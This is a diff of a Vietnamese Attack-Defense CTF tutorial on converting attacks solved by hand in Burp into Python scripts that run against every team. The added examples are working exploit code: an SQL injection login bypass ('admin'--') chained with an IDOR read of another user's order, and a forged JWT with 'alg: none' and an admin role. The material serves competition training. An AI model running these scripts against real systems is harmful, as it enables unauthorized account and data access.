@@ -10,7 +10,15 @@ Không cố nhớ hết — mục tiêu là **hiểu khái niệm**, vì các fi
 
 Trong thi Attack-Defense, bạn giải 1 lỗi trên **1 đội** bằng Burp (click chuột: Repeater, Intruder...). Nhưng có 10-20 đội khác cũng dính lỗi y hệt (vì cùng code). Bấm Burp cho từng đội là không kịp. Script Python làm đúng việc Burp đã làm, nhưng **lặp lại tự động cho tất cả đội trong vài giây**.
 
-Vậy bản chất không có gì mới: **script Python chỉ là "ghi lại" đúng request mà Burp đã gửi thành công, rồi lặp nó**.
+Vậy bản chất không có gì mới: **script Python chỉ là "ghi lại" đúng (các) request mà Burp đã gửi thành công, rồi lặp nó**.
+
+**Lưu ý quan trọng — không phải bài nào cũng chỉ 1 request:**
+
+- Nhiều bài cần **2-3 request nối tiếp** (login lấy cookie → lấy ID → dùng ID gửi request cuối). Đây không phải trường hợp đặc biệt, mà là **chuẩn**: xem mục 5 ở dưới (ví dụ 3 bước) và toàn bộ [`02_Chuoi_Request/`](02_Chuoi_Request/).
+- Một số bài có bước **không phải gửi request HTTP** mà là tính toán cục bộ ngay trong Python: decode/giải mã 1 token, tính hash, brute-force 1 giá trị, hoặc gọi 1 tool ngoài — rồi **mới dùng kết quả đó** để gửi request. Xem [`02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md`](02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md).
+- Một số bài dùng kênh khác không phải HTTP request/response thường (WebSocket) — xem [`03_Thao_Tac_Nang_Cao/04_WebSocket.md`](03_Thao_Tac_Nang_Cao/04_WebSocket.md).
+
+Cách nhận biết: cứ **liệt kê đúng những bước tay bạn đã làm trên Burp/trình duyệt để ra flag**, theo thứ tự. Mỗi bước là 1 đoạn code trong `solve_one()`, theo đúng thứ tự đó — có bao nhiêu bước tay thì có bấy nhiêu đoạn code, không bắt phải gộp về 1 request.
 
 ---
 
@@ -192,9 +200,11 @@ pip install requests beautifulsoup4
 
 ## 5. Ví dụ đầy đủ: từ "giải tay trên Burp" đến "script chạy được"
 
-Giả sử bạn vừa giải tay 1 bài trên Burp: trang `/login` có 1 lỗi SQL injection ở field `username`, bạn đã test trên Burp Repeater và thấy payload `admin'--` cho đăng nhập thành công, sau đó `/dashboard` hiện flag dạng `FHACKER2026{...}`.
+### Ví dụ 1 — chuỗi 3 request (login → lấy ID → IDOR)
 
-**Bước 1 — Ghi lại chính xác 2 request đã chạy được trên Burp** (xem trong tab Repeater):
+Giả sử bạn vừa giải tay 1 bài trên Burp, **3 bước**: (1) login bằng SQLi `admin'--`, (2) GET `/api/me` để lấy `user_id` của mình, (3) GET `/api/orders/{id}` với `id = user_id + 1` (IDOR) để đọc đơn hàng của người khác, trong đó có flag.
+
+**Ghi lại chính xác 3 request đã chạy được trên Burp:**
 
 ```
 POST /login HTTP/1.1
@@ -203,67 +213,106 @@ Content-Type: application/x-www-form-urlencoded
 
 username=admin'--&password=x
 ```
-
 ```
-GET /dashboard HTTP/1.1
+GET /api/me HTTP/1.1
 Host: 10.0.2.1:8000
-Cookie: session=<cookie Burp nhận được sau request trên>
+Cookie: session=<cookie nhận được sau request trên>
+```
+```
+GET /api/orders/43 HTTP/1.1
+Host: 10.0.2.1:8000
+Cookie: session=<cookie giữ nguyên>
 ```
 
-**Bước 2 — Viết thành script, dịch từng dòng theo bảng ở mục 2:**
+**Viết thành script — mỗi request Burp phía trên là 1 đoạn trong `solve_one()`, giữ đúng thứ tự:**
 
 ```python
 import re
 import requests
 
 def solve_one(session, base_url):
-    # Bước 1 trên Burp: POST /login với body form username=admin'--&password=x
-    # -> Content-Type form-urlencoded nên dùng data=, không dùng json=
-    r = session.post(
+    # Request 1 trên Burp: POST /login, body form username=admin'--&password=x
+    r1 = session.post(
         f"{base_url}/login",
         data={"username": "admin'--", "password": "x"},
         timeout=5,
     )
-    # Kiểm tra ngay: Burp cho 200/302 thì ở đây cũng phải vậy, không thì sai gì rồi
-    if r.status_code not in (200, 302):
-        return None  # không login được, dừng sớm, không cố đọc dashboard
+    if r1.status_code not in (200, 302):
+        return None  # không login được, dừng sớm
 
-    # Bước 2 trên Burp: GET /dashboard
-    # Không cần tự set Cookie: session=... vì `session` (requests.Session())
-    # đã tự giữ cookie từ response của bước 1 -- đây là lý do PHẢI dùng chung 1 session
-    r2 = session.get(f"{base_url}/dashboard", timeout=5)
+    # Request 2 trên Burp: GET /api/me -- lấy user_id của chính mình
+    # Không cần set Cookie tay vì `session` tự giữ cookie từ request 1
+    r2 = session.get(f"{base_url}/api/me", timeout=5)
+    try:
+        my_id = r2.json()["id"]        # sửa key "id" theo đúng response thật
+    except Exception:
+        return None                    # không đọc được id, dừng, không đoán mò
 
-    # Trích flag bằng regex, giống việc bạn tự đọc bằng mắt trong Burp
-    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r2.text)
+    # Request 3 trên Burp: GET /api/orders/{id khác mình} -- đây là bước IDOR
+    # id của request 3 LẤY TỪ KẾT QUẢ request 2, không hard-code 43 như lúc tay
+    r3 = session.get(f"{base_url}/api/orders/{my_id + 1}", timeout=5)
+
+    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r3.text)
     return m.group(0) if m else None
 
 
 if __name__ == "__main__":
-    # Test tay 1 đội trước khi thả vào template.py để quét toàn bộ targets.txt
     s = requests.Session()
     s.verify = False
-    flag = solve_one(s, "http://10.0.2.1:8000")
-    print("Flag:", flag)
+    print("Flag:", solve_one(s, "http://10.0.2.1:8000"))
 ```
 
-**Bước 3 — Chạy thử:**
+Chạy `python bai1.py`:
+- In ra `Flag: FHACKER2026{...}` → copy `solve_one` vào [`scripts/template.py`](scripts/template.py).
+- In ra `Flag: None` → thêm `print(r1.status_code, r2.status_code, r2.text[:200], r3.status_code, r3.text[:200])` để biết **request nào** sai trong 3 request, rồi so với Burp từng request đó — đừng đoán, in ra và nhìn.
 
-```bash
-python bai1.py
+Đây là quy trình chung: **có bao nhiêu request tay thì viết bấy nhiêu đoạn trong `solve_one()`, theo đúng thứ tự**, request sau lấy dữ liệu từ response của request trước (xem thêm [`02_Chuoi_Request/03_Truyen_ID_Giua_Cac_Buoc.md`](02_Chuoi_Request/03_Truyen_ID_Giua_Cac_Buoc.md)).
+
+### Ví dụ 2 — có bước không phải request (tính toán cục bộ)
+
+Không phải lúc nào mọi bước cũng là "gửi request". Ví dụ: cookie `session` là 1 JWT dạng `header.payload.signature`, server quên kiểm `alg: none` — bạn đã test tay bằng cách tự sửa JWT (decode base64, đổi `"role":"user"` thành `"role":"admin"`, encode lại, bỏ signature) rồi dán cookie mới vào Burp và request `/admin` thành công.
+
+Bước "sửa JWT" này **không gửi request nào cả** — nó là xử lý chuỗi thuần Python, chèn vào **giữa** 2 request:
+
+```python
+import base64
+import json
+import requests
+
+def b64url_encode(data: dict) -> str:
+    raw = json.dumps(data, separators=(",", ":")).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+def solve_one(session, base_url):
+    # Request 1: lấy JWT ban đầu (vai user thường)
+    r1 = session.post(f"{base_url}/login", data={"username": "user", "password": "user"}, timeout=5)
+    token = session.cookies.get("session")
+    if not token:
+        return None
+
+    # --- Bước tính toán cục bộ, KHÔNG có request nào ở đây ---
+    header_b64, payload_b64, _sig = token.split(".")
+    new_header = b64url_encode({"alg": "none", "typ": "JWT"})
+    payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
+    payload["role"] = "admin"               # sửa claim ngay trong Python, không qua Burp nữa
+    new_payload = b64url_encode(payload)
+    forged_token = f"{new_header}.{new_payload}."   # alg=none -> signature để trống
+    # --- Hết bước tính toán, giờ mới gửi request tiếp ---
+
+    session.cookies.set("session", forged_token)
+    r2 = session.get(f"{base_url}/admin", timeout=5)
+    return r2.text if "FHACKER2026{" in r2.text else None
 ```
 
-- Nếu in ra `Flag: FHACKER2026{...}` → đúng, copy hàm `solve_one` này vào [`scripts/template.py`](scripts/template.py) để quét hết `targets.txt`.
-- Nếu in ra `Flag: None` → thêm `print(r.status_code, r.text[:300])` ngay sau request bị nghi ngờ (thường là request đầu), chạy lại, so nội dung in ra với response bạn thấy trong Burp. 95% lỗi ở đây là: sai `Content-Type` (form vs JSON), thiếu 1 field body, hoặc dùng 2 session riêng cho 2 bước làm mất cookie.
-
-Đây chính là quy trình bạn sẽ lặp lại cho **mọi** bài trong giờ thi: giải tay → chép request → dịch theo mục 2 → test 1 đội → copy vào `template.py`.
+Dạng bước cục bộ này (decode/encode token, tính hash, brute-force giá trị, gọi tool ngoài) gặp nhiều ở bài JWT/crypto — xem chi tiết và thêm ví dụ ở [`02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md`](02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md).
 
 ---
 
 ## 6. Đi tiếp từ đây
 
 - Loại request cụ thể (GET/POST/header/cookie/upload/encode): [`01_Request_Co_Ban/`](01_Request_Co_Ban/)
-- Login giữ phiên, lấy CSRF token, truyền ID giữa các bước, đọc response: [`02_Chuoi_Request/`](02_Chuoi_Request/)
-- Lặp nhiều đội, song song, polling: [`03_Thao_Tac_Nang_Cao/`](03_Thao_Tac_Nang_Cao/)
+- Login giữ phiên, lấy CSRF token, truyền ID giữa các bước, đọc response, tính toán cục bộ giữa 2 request: [`02_Chuoi_Request/`](02_Chuoi_Request/)
+- Lặp nhiều đội, song song, polling, WebSocket: [`03_Thao_Tac_Nang_Cao/`](03_Thao_Tac_Nang_Cao/)
 - Payload theo từng loại lỗ hổng (SQLi, IDOR, LFI, SSTI, SSRF...): [`04_Theo_Lo_Hong/`](04_Theo_Lo_Hong/)
 - Script bị lỗi, Burp chạy được mà Python không: [`06_Debug/`](06_Debug/)
 - Mục lục tra cứu nhanh khi đang thi: [`CHEATSHEET_NHANH.md`](CHEATSHEET_NHANH.md)
